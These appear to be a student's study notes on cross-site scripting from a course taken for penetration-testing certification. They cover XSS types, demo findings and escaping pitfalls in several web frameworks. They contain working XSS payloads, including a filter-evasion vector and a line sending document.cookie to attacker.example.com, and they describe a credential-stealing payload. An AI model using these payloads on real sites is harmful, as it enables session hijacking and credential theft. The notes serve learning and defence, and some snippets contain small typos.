# Specialized Testing: XSS
- This is not part of the Practice Ethical Hacker Course, but I found it relevant to preparing for the PJPT
## Course Overview
- XSS is an attack known since the late 90s
- There are many different types
- Web apps need to be prepared to defend against them

Plan:
- Different types of XSS
- Reflected, stored, and DOM-based XSS
- Test a web app for XSS
- Look for XSS patterns

Prerequisites:
- HTTP
- HTML
- JavaScript

## XSS Fundamentals
### History of XSS
- Microsoft security engineers coined the term in Jan 2000
- XSS worm; vulnerability in Hotmail found in October 2002 by Berend-Jan Wever
- Samy (MySpace worm) Myspace exploit by Samy Kamkar in Ocotober 2005
- Old attack but still there
- Doesn't go away, more and more relevant

### Same-Origin Policy
- Auditor job: usually is to find a vulnerability, prove there is one, and there is an exploit
- Same-origin policy is supposed to protect apps ("soul security JS mechanism")
- Same-origin policy says JS only has access to things of same domain, protocol, and port

Example:
- Web page uses JS 3 times; 1 inline block and 2 external JS files
- One is a script file that resides in the same origin
- The other is pulled from a CDN, a JS file on another server
- The file from the CDN is also the same origin otherwise jquery wouldn't be able to access any elements on the page
- The origin of any JavaScript code is defined by the origin of the page that executes it
- Origin is not literal. JS runs in the security context of the page
- If you can inject JS, it runs with the same privileges and security context of the page

### Executing JavaScript Code
- We  must know how JS code may be executed to exploit the vulnerabilities
- There are 2 main approaches

\<Script> element:
- Reference an external file
- Local file
- Different server
- Inline JS
- Inline is common for testing:
```
<script>
  doStuff();
</script>
```

HTML attribute:
- Start with on and then the name of an event:
```
<input
  oninput="doStuff()"
  type="text">
```
- The code will run when the even is fired
- Over 100 different events
- Some web apps use a denial list of events

Mutated XSS:
`<img ="><script>alert(1)</script>">`
- It looks like an image tag and an attribute without a name
- Value in double quotes with angle brackets
- HTML doesn't have to be 100% correct
- Browsers compensate, too much here
- Replaces attribute value with JS code
- Specific vector used to evade some filters

### Types of Cross-Site Scripting
Reflected XSS:
- Type 1
- Attack is part of the HTTP request
- Request contains malicous JS code etc.
- Reflected means returned by the server
- Most common

Stored XSS:
- Type 2
- Persistent
- JS code injected into app affects other users
- More dangerous than reflected XSS
- Less common

DOM-based XSS:
- Type 0
- Everything happens in the browser
- No server involved
- Super rare but increasing with SPAs

## Reflected XSS
### Introduction:
- Find and exploit in demo app
- Demo app is for events and ticktts
- Has login and search features

### Reflected XSS in Detail
- Often typical patterns

Example:
- A search function that displays the search term on the results page
- In PHP: "You searched for: `<?= $_GET['q'] ?>`"
- This is insecure processing of the search query
- The search query can be a payload: `<script>alert(1)</script>` resulting in reflected XSS
- In an HTML attribute: `<input type="text" name="q" value="<?= $_GET['q'] ?>`
- Also insecure processing of the search query but requires triggering an event
- `<script>alert(1)</script>` would be treated as text
- Set up JS event handler: `" onmouseover="alert(1)` executing the JS when the mouse moves over the text

### Demo: Finding Reflected XSS
- To prove XSS, the web app must return data we put in the HTTP request
- HTTP header or cookie would attack ourselves
- Instead use a query string or post form
- Search for `<script>alert(1)</script>`
- The result page shows an empty string for the search query and no alert popup
- Source code of the response shows `<script>alert(1)</script>`
- Response headers include Content‑Security‑Policy, blocking the execution
- Not effective in preventing XSS
- A browser plugin can disable Content‑Security‑Policy
- Once disabled, the JS executes andd the alert pops up
- Shows the header does not make the app secure on its own

Implication:
- alert(1) is a PoC to demonstrate reflected XSS is possible
- Attacker can set a malicous payload in the URL
- The URL can be sent to a victim
- Attack is perfomed when victim opens the URL

### Demo: Stealing Authentication Information with XSS
- Steal session cookies via XSS
- A logged in user has a cookie handling the session
- Session holds the authentication state
- Session cookie identifies the user against the server
- HTTPOnly flag is not set allow JS to access the cookie
- Attacker can exploit this by writing a payload that sends the cookie to their server: `<script>new Image().$rc = "http://attacker.example.com/?" + document.cookie</script>`
- Attacker receives the session cookie and replaces their cookie with the victim's cookie
- This logs the attacker in as the victim, known as session hijacking

## Stored XSS:
### Introduction
- Demo site new features: add events, register account, list of current users

### Stored XSS in Detail:
- JS stored in database outputed verbatim
- Users won't have to click on a link, only interact with the site

### Demo: Finding Stored XSS
- Need to find places where we can store data
- Creating an event stores data
- Name the event `<script>alert(1)</script>`
- In the events page, `<script>alert(1)</script>` is displayed as text as it is properly escaped
- May not always be escaped
- Clicking on the event details, the alert pops up. No escaping!
- Looking at the source code, we can see the output was verbatim
- Everyone going onto the details page will get the JS executed
- No clicking on links needed, very dangerous

### Demo: Finding more stored XSS
- If there is one vulnerability in a web app, chances are there are more
- Registering a user stores data
- This is then displayed on the site
- Set the user name to `<script>alert(1)</script>`
- Once logged in, the JS executes, as it is not properly escaped
- All users are now affected by it since the name being displyed for all users, especially dangerous

### Demo: Stealing Credentials with XSS
- Let's see what an attacker can do with XSS
- An attacker can steal credentials from an unsuspecting victim
- First need 2 things: browser for location of attack, attacker controlled server

User name is prepared JS:
  - First accesses an element with the ID account that is the login form
  - Once form is submitted, use a trick
  - Use an image to create an HTTP request to attacker's server
  - Appended with email address and password entered into the login field
- When this code is active, before logging in, this HTTP request is made
- Attacker is logged in already and when another user logs in, the attacker receives their email and password

## DOM-Based XSS
### Introduction
- Used the document object module
- The API that can be used in brosers to access the content of the currently loaded page

### DOM-based XSS in Detail
- Works on the client-side only
- Doesn't request documents from the server
- JS part of the app can be triggered to run malicious JS

### Demo: Finding DOM-Based XSS
- A search term is appended to the URL as a hash
- This is entirely on the client-side and not send to the server
- Looking in the client-side code, the innerHTML property of the h1 header is set to 'Search: ' + the searchTerm
- But the searchTerm is taken from the hash value
- Making `<script>alert(1)</script>` makes it part of the hash but there is no alert
- Looking at the h1 element, the searchTerm is verbatim
- When writing a script tag via innerHTML, it wont run immediately
- JS can be included otherways like an attribute
- `marquee` can be used instead and won't require user interaction
- Entering `<marquee onstart="alert(1)">XSS</marquee>` as the searchTerm runs the JS immediately getting the alert and the marquee
- JS runs everytime the marquee does

### Demo: Finding XSS in JavaScript Code
- Not DOM-based but related
- When input that is sent to the server that is HTML escaped but is used within a script element
- In a JS context there are additional special characters
- Replace the special characters with `\x` and the ASCII code of the character in hex format
- Replacing the `<` in `<script>alert(1)</script>` with `x3` results in the alert

## Finding XSS in Code
### Introduction
- We can do a static code analysis rather than dynamic
- Look directly at the source code to find issues
- Look to see if input is coming from user supplied data

### Finding XSS in PHP Applications
- PHP is the number on server-side programming stack for web apps
- `htmlspecialchars` is a built-in PHP function to escape special characters
- Using it by default is not sufficient as it does't escape single quotes
- You need to provide the flag `ENT_QUOTES` to protect against XSS
- To be even safer, use the `charset` encoding as the third argument

### Finding XSS in PHP Framework-based Applications
- Many PHP based applications use a framework instead

Symfony:
- Automatically escapes content in an HTML context by default
- Requires appending ` | raw` to avoid escaping characters

Laravel/Blade:
- Everything is HTML escaped by default
- Requires prepending and appending `!!` to avoid esacping

Laminas:
- Does not automatically escape data
- "laminas-escaper" package provides helper functionality for escaping content
-  Methods for escaping HTML, JS content, and more

### Finding XSS in ASP.NET Core Applications
- Using `@model.EventName` automically escapes content in an HTML context
- Using `@Html.Raw()` outputs content verbatim, no HTML escaping
- Using `HttpUtility.JavaScriptStringEncode(s)` provides escaping for JS

### Finding XSS in Angular Applications
- Using `<p>{{ value  }}<p>` does automatic HTML escaping
- Angular does not trust any data unless developer tells Angular to
- Using `<p [innerHTML]="value"></p>` does not escape HTML
- `byPassSecurityTrust*()` and `nativeElement.innerHTML` have no escaping

### Finding XSS in React Applications
- React is a popular SPA framework choice
- Comes with the XSS protection out of the box
- `<p>{this.value}</p>`: Automatic HTML escaping
- `<p dangerlySetInnerHTML={{ __html: this.value }}></p>`: No HTML escaping
- `<a href={this.value}>XSS</a>`: No URL escaping
- `<p ref="{this.Ref}"></p> this.Ref.current.innerHTML = "...";`: No escaping
- `let node = ReactDOM.findDOMNode(cmp); node.innerHTML = "...";`: No escaping

### Finding XSS in Vue.js
- Another popular SPA framework
- Does HTML escaping by default
- `<p>{{ value }}</p>` and `<p :title="value">`: Automatic HTML escaping
- `<p v-html="value">`, `<p innerHTML={this.value}></p>`, and `<a :href="value">XSS</a>`: No escaping
